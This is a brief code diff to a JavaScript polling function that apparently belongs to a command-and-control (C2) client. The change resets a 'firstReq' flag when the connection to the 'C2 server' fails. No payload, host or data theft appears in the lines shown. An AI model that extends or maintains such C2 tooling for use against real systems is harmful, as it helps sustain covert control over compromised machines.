@@ -175,6 +175,7 @@ function pollServer() {
             });
         }).on('error', err => {
             console.error(`Error connecting to C2 server: ${err.message}`);
+            firstReq = true;
         });
     }
 
